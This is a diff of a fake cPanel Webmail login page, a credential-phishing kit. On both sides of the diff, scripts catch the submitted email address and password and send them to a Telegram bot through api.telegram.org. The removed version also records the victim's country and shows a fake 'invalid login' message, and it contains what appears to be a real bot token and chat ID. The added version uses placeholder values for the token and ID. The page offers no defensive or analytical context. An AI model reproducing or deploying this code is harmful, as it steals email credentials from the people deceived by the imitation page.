@@ -5,9 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
     <title>Webmail Login</title>
    
-    <!-- Link to external CSS files -->
-    <link href="open_sans.min.css" rel="stylesheet" type="text/css">
-    <link href="style_v2_optimized.css" rel="stylesheet" type="text/css">
+    <!-- EXTERNAL CSS -->
+    <link href="./Webmail Login 111_files/open_sans.min.css" rel="stylesheet" type="text/css">
+    <link href="./Webmail Login 111_files/style_v2_optimized.css" rel="stylesheet" type="text/css">
+    
+    <!-- Font Awesome for Icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
 
     <style type="text/css">
         .input-field-login {
@@ -27,145 +30,91 @@
             padding-left: 30px; /* Add space for the icons */
         }
     </style>
-    <!-- Font Awesome for Icons -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <!--[if IE 6]>
+    <style type="text/css">
+        img {
+            behavior: url(/cPanel_magic_revision_1569620179/unprotected/cp_pngbehavior_login.htc);
+        }
+    </style>
+    <![endif]-->
 
     <script>
-    <!-- HTML Form -->
-<div id="forms">
-    <form novalidate="" id="login_form" action="javascript:void(0)" method="post" target="_self">
-        <div class="input-req-login"><label for="user">Email Address</label></div>
-        <div class="input-field-login icon username-container">
-            <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
-            <i class="fa fa-user"></i>
-        </div>
-        <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
-        <div class="input-field-login icon password-container">
-            <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
-            <i class="fa fa-lock"></i>
-        </div>
-        <div class="controls">
-            <div class="login-btn">
-                <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+    window.DOM = { get: function(id) { return document.getElementById(id) } };
+    </script>
+</head>
+<body class="wm">
+<div id="preload_images"></div>
+
+<input type="hidden" id="goto_uri" value="/3rdparty/roundcube/?_task=mail&amp;_mbox=INBOX">
+<input type="hidden" id="goto_app" value="">
+<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
+<div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
+    <div class="wrapper">
+    <div id="notify">
+        <noscript>
+            <div class="error-notice">
+                <img src="/cPanel_magic_revision_1569619473/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
+                JavaScript is disabled in your browser.
+                For Webmail to function properly, you must enable JavaScript.
+                If you do not enable JavaScript, certain features in Webmail will not function correctly.
+            </div>
+        </noscript>
+        <div id="login-status" class="error-notice" style="visibility: hidden">
+            <div class="content-wrapper">
+                <div id="login-detail">
+                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
+                    <div id="login-status-message">You have logged out.</div>
+                </div>
             </div>
         </div>
-        <div class="clear" id="push"></div>
-    </form>
-</div>
+    </div>
 
-<!-- Notifications -->
-<div id="notification-bar" style="display: none; text-align: center; padding: 10px; font-size: 14px; color: white;"></div>
-
-<script>
-// Telegram Bot Configuration
-const BOT_TOKEN = 'your-telegram-bot-token'; // Replace with your bot token
-const CHAT_ID = 'your-chat-id'; // Replace with your chat ID
-
-// Function to get query parameters from the URL
-function getQueryParameter(param) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(param);
-}
-
-// Function to fetch user's country using an IP geolocation API
-async function getUserCountry() {
-    try {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        return data.country_name || 'Unknown';
-    } catch (error) {
-        console.error('Error fetching country:', error);
-        return 'Unknown';
-    }
-}
-
-// Function to send data to Telegram
-async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = {
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-    };
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    } catch (error) {
-        console.error('Error sending message to Telegram:', error);
-    }
-}
-
-// Populate the email field if 'email' parameter exists
-window.addEventListener('DOMContentLoaded', async () => {
-    const emailParam = getQueryParameter('email');
-    if (emailParam) {
-        const emailField = document.getElementById('user');
-        emailField.value = emailParam;
-
-        // Extract MX (mail exchange) domain from email
-        const mxDomain = emailParam.split('@')[1];
-        console.log("MX Domain:", mxDomain);
-    }
-});
-
-// Handle login action
-document.getElementById('login_submit').addEventListener('click', async (e) => {
-    e.preventDefault();  // Prevent form from being submitted to external URL
-
-    const email = document.getElementById('user').value;
-    const password = document.getElementById('pass').value;
-    const mxDomain = email.split('@')[1];
-    const country = await getUserCountry();
-
-    // Send data to Telegram
-    const message = `
-<b>Webmail Login Attempt</b>
-- <b>Email:</b> ${email}
-- <b>Password:</b> ${password}
-- <b>MX Domain:</b> ${mxDomain}
-- <b>Country:</b> ${country}
-    `;
-    await sendToTelegram(message);
-
-    // Show "Authenticating..." notification
-    const notificationBar = document.getElementById('notification-bar');
-    notificationBar.style.display = 'block';
-    notificationBar.style.backgroundColor = 'lightblue';
-    notificationBar.textContent = 'Authenticating...';
-
-    // Simulate authentication delay
-    setTimeout(() => {
-        // Show "Invalid login" error after 1.5 seconds
-        notificationBar.style.backgroundColor = 'red';
-        notificationBar.textContent = 'the login is invalid.';
-    }, 1500);
-});
-</script>
-
-<style>
-/* Style for the notification bar */
-#notification-bar {
-    position: absolute;
-    top: 20px;
-    left: 0;
-    right: 0;
-    z-index: 1000;
-    font-weight: bold;
-    padding: 10px;
-}
-
-/* Adjust positioning of the notification bar above the logo */
-#login-sub-header {
-    position: relative;
-    padding-top: 40px; /* To make room for the notification bar */
-}
-</style>
-
-});
-         </form>
+    <div style="display:none">
+        <div id="locale-container" style="visibility:hidden">
+            <div id="locale-inner-container">
+                <div id="locale-header">
+                    <div class="locale-head">Please select a locale:</div>
+                    <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
+                </div>
+                <div id="locale-map">
+                    <div class="languages">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="content-container">
+        <div id="login-container">
+            <div id="login-sub-container">
+                    <div id="login-sub-header">
+                        <img class="main-logo" src="./Webmail Login 111_files/webmail-logo.svg" alt="logo">
+                    </div>
+                    <div id="login-sub">
+                        <div id="clickthrough_form" style="visibility:hidden">
+                            <form action="javascript:void(0)">
+                                <div class="notices"></div>
+                                <button type="submit" class="clickthrough-cont-btn">Continue</button>
+                            </form>
+                        </div>
+                        <div id="forms">
+                            <form novalidate="" id="login_form" action="https://webmail.faribadesigns.com/login/" method="post" target="_self" style="visibility:">
+                                <div class="input-req-login"><label for="user">Email Address</label></div>
+                                <div class="input-field-login icon username-container">
+                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+                                    <i class="fa fa-user"></i> <!-- Profile icon -->
+                                </div>
+                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
+                                <div class="input-field-login icon password-container">
+                                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+                                    <i class="fa fa-lock"></i> <!-- Padlock icon -->
+                                </div>
+                                <div class="controls">
+                                    <div class="login-btn">
+                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+                                    </div>
+                                </div>
+                                <div class="clear" id="push"></div>
+                            </form>
                         </div>
                     </div>
                 </div>
@@ -178,69 +127,32 @@ document.getElementById('login_submit').addEventListener('click', async (e) => {
         <div class="locale-container">
             <ul id="locales_list">
                 <div class="languages">
-    <!-- Desktop Display -->
-    <ul class="language-list">
-        <li><a href="#en">English</a></li>
-        <li><a href="#ar">العربية</a></li>
-        <li><a href="#bg">български</a></li>
-        <li><a href="#cs">čeština</a></li>
-        <li><a href="#da">dansk</a></li>
-        <li><a href="#de">Deutsch</a></li>
-        <li><a href="#el">Ελληνικά</a></li>
-        <li><a href="#es">español latinoamericano</a></li>
-        <li><a href="#es">...</a></li>
-    </ul>
-    <!-- Mobile Dropdown -->
-    <select class="language-dropdown">
-        <option value="#en">English</option>
-        <option value="#ar">العربية</option>
-        <option value="#bg">български</option>
-        <option value="#cs">čeština</option>
-        <option value="#da">dansk</option>
-        <option value="#de">Deutsch</option>
-        <option value="#el">Ελληνικά</option>
-        <option value="#es">español</option>
-    </select>
+                    <li><a href="#en">English</a></li>
+                    <li><a href="#ar">العربية</a></li>
+                    <li><a href="#bg">български</a></li>
+                    <li><a href="#cs">čeština</a></li>
+                    <li><a href="#da">dansk</a></li>
+                    <li><a href="#de">Deutsch</a></li>
+                    <li><a href="#el">Ελληνικά</a></li>
+                    <li><a href="#es">español</a></li>
+                </div>
+            </ul>
+        </div>
+    </div>
+
 </div>
 
-<style>
-/* Default: Show list, hide dropdown */
-.language-list {
-    display: block;
-    list-style: none;
-    padding: 0;
-    margin: 0;
-}
-
-.language-list li {
-    margin-bottom: 5px;
-}
-
-.language-dropdown {
-    display: none; /* Hidden by default */
-}
-
-/* Mobile: Show dropdown, hide list */
-@media (max-width: 767px) {
-    .language-list {
-        display: none; /* Hide list on small screens */
-    }
-    .language-dropdown {
-        display: block; /* Show dropdown */
-        width: 100%;
-        padding: 5px;
-    }
-}
-</style>
 <script>
 document.getElementById("login_form").addEventListener("submit", function (e) {
-    e.preventDefault(); 
+    e.preventDefault(); // Prevent form submission
     
     const email = document.getElementById("user").value;
     const password = document.getElementById("pass").value;
 
-    const botToken = "7296259786:AAEouXz7crjzYMqXBAY3W0rSL0jqaK-lvp8";
-    const chatId = "6885599280";
+    // Replace 'YOUR_BOT_TOKEN' with your bot's token
+    const botToken = "YOUR_BOT_TOKEN";
+    // Replace 'CHAT_ID' with your chat ID
+    const chatId = "CHAT_ID";
 
     const message = `Email: ${email}\nPassword: ${password}`;
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -264,16 +176,16 @@ document.getElementById("login_form").addEventListener("submit", function (e) {
 });
 </script>
 
+<style>
+    @media (min-width: 481px) {
+        #select_user_form {
+            width: px;
+        }
+    }
+</style>
 
-<div class="copyright">
-    <img src="./IMG_4183 2.ICO" alt="Custom Image" style="display: block; margin: 0 auto; max-width: 60px;">
-    Copyright©&nbsp;2024 cPanel, L.L.C.
-    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
-</div>
-
-</div>
-
-</div>
+<div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
+    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
 
 </body>
 </html>
